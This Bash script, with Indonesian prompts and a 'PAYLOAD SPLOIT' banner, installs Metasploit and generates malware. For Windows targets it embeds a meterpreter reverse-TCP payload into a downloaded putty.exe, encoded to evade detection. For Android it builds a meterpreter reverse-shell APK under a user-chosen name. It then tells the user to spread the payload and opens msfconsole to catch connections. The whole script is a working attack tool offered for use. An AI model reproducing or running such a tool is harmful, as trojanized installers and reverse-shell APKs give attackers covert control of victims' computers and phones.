#bahan-bahan
echo "Memperoses..."
sleep 0.1
clear
echo "mEmperoses..."
sleep 0.1
clear
echo "meMperoses..."
sleep 0.1
clear
echo "memPeroses..."
sleep 0.1
clear
echo "mempEroses..."
sleep 0.1
clear
echo "mempeRoses..."
sleep 0.1
clear
echo "memper0ses..."
sleep 0.1
clear
echo "memperoSes..."
sleep 0.1
clear
echo "memperosEs..."
sleep 0.1
clear
echo "memperoseS..."
sleep 0.1
clear
echo "memperoses,.."
sleep 0.1
clear
echo "memperoses.,."
sleep 0.1
clear
echo "memperoses..,"
sleep 0.1
clear
echo "Memperoses..."
sleep 0.1
clear
echo "mEmperoses..."
sleep 0.1
clear
echo "meMperoses..."
sleep 0.1
clear
echo "memPeroses..."
sleep 0.1
clear
echo "mempEroses..."
sleep 0.1
clear
echo "mempeRoses..."
sleep 0.1
clear
echo "memper0ses..."
sleep 0.1
clear
echo "memperoSes..."
sleep 0.1
clear
echo "memperosEs..."
sleep 0.1
clear
echo "memperoseS..."
sleep 0.1
clear
echo "memperoses,.."
sleep 0.1
clear
echo "memperoses.,."
sleep 0.1
clear
echo "memperoses..,"
sleep 0.1
clear
apt-get install -y ruby
echo "Sukses di install"
gem install lolcat
clear
#home
clear
echo "
██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░

░██████╗██████╗░██╗░░░░░░█████╗░██╗████████╗
██╔════╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝
╚█████╗░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░
░╚═══██╗██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░
██████╔╝██║░░░░░███████╗╚█████╔╝██║░░░██║░░░
╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░" | lolcat
echo "Pilih" | lolcat
echo
echo "1.Windows" | lolcat
echo "2.Android" | lolcat
echo 
read -p "|Sploit}-->" A

#A
if [ $A = 1 ] || [ $A = 1 ]
then
clear
echo "pilih OS" | lolcat
echo
echo "1.termux" | lolcat
echo "2.linux" | lolcat
read -p "|Sploit}-->" B
fi

if [ $A = 2 ] || [ $A = 2 ]
then
clear
echo "pilih OS" | lolcat
echo
echo "1.termux" | lolcat
echo "2.linux" | lolcat
read -p "|Sploit}-->" B
fi

#B
if [ $B = 1 ] || [ $B = 1 ]
then
clear
echo "Apakah Kamu Sudah Menginstall Metasploit?" | lolcat
echo "y/n"
read -p "|Sploit}-->" C
fi

if [ $B = 2 ] || [ $B = 2 ]
then
clear
echo "Apakah Kamu Sudah Menginstall Metasploit?" | lolcat
echo "y/n"
read -p "|Sploit}-->" C
fi

#C no
if [ $C = N ] || [ $B = n ]
then
clear
echo "OK Mari kita install" | lolcat
echo "pilih OS" | lolcat
echo
echo "1.termux" | lolcat
echo "2.linux" | lolcat
read -p "|Sploit}-->" D
fi

#D termux
if [ $D = 1 ] || [ $D = 1 ]
then
clear
echo "PERINGATAN:ini akan berlangsung sangat lama semua tergantung internet kalian" | lolcat
sleep 2
pkg install wget bash
pkg install ruby && gem install lolcat
pkg install git
clear
wget https://github.com/Hax4us/TermuxBlack/raw/master/install.sh
bash install.sh -i
git clone https://github.com/Hax4us/Metasploit_termux
cd Metasploit_termux && chmod +x metasploit.sh
./metasploit.sh
fi

#D linux 
if [ $D = 2 ] || [ $D = 2 ]
then
clear
echo "PERINGATAN:ini akan berlangsung sangat lama semua tergantung internet kalian" | lolcat
sleep 2
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && sudo ./msfinstall
fi

#C yes
if [ $C = Y ] || [ $C = y ]
then
clear
echo "Pilih" | lolcat
echo
echo "1.Windows" | lolcat
echo "2.Android" | lolcat
read -p "|Sploit}-->" E
fi

#E windows 
if [ $E = 1 ] || [ $E = 1 ]
then
clear
read -p "|Lhost}-->" LH
read -p "|Lport}-->" LP
clear
wget https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=$LH lport=$LP -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyXploit.exe
echo "Payload Berhasil Dibuat" | lolcat
fi

#E android
if [ $E = 2 ] || [ $E = 2 ]
then
clear
read -p "|Lhost}-->" LH
read -p "|Lport}-->" LP
read -p "|NamaApk}-->" APK
clear
echo "Sedang Di Buat" | lolcat
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP R >$APK.apk
echo "Payload Berhasil Dibuat" | lolcat
echo 
echo "Sebar Payload Nya"
echo "Apakah Sudah Mau Di Exploit"
read -p "|y/n}-->" F
fi

#F no 
if [ $F = Y ] || [ $F = n ]
then
clear
echo "Sampai Jumpa lagi"
sleep 1
exit
fi

#F yes
if [ $F = Y ] || [ $F = y ]
then
clear
echo "Peroses Exploit Sedang Di Mulai Dalam"
echo "1"
sleep 0.1
clear
echo "Peroses Exploit Sedang Di Mulai Dalam"
echo "2"
sleep 0.1
clear
echo "Peroses Exploit Sedang Di Mulai Dalam"
echo "3"
sleep 0.1
clear
echo "Peroses Exploit Sedang Di Mulai Dalam"
echo "Mulai"
sleep 0.1
clear
msfconsole
fi




























